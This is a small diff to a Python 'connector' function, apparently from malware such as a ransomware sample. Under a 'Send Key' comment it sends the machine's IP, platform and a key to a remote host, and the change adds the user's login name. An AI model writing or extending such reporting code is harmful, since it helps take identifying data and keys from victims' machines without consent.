@@ -23,9 +23,9 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        message = '%s$%s$%s' % (getlocalip(), platform, key)
+        message = '%s$%s$%s$%s' % (getlocalip(), platform, key, getpass.getuser())
         server.send(message.encode('utf-8'))
-        print("Message sent: %s$%s$%s" % (getlocalip(), platform, key))
+        print("Message sent: %s" % (message))
 
     except Exception as e:
         print(e)
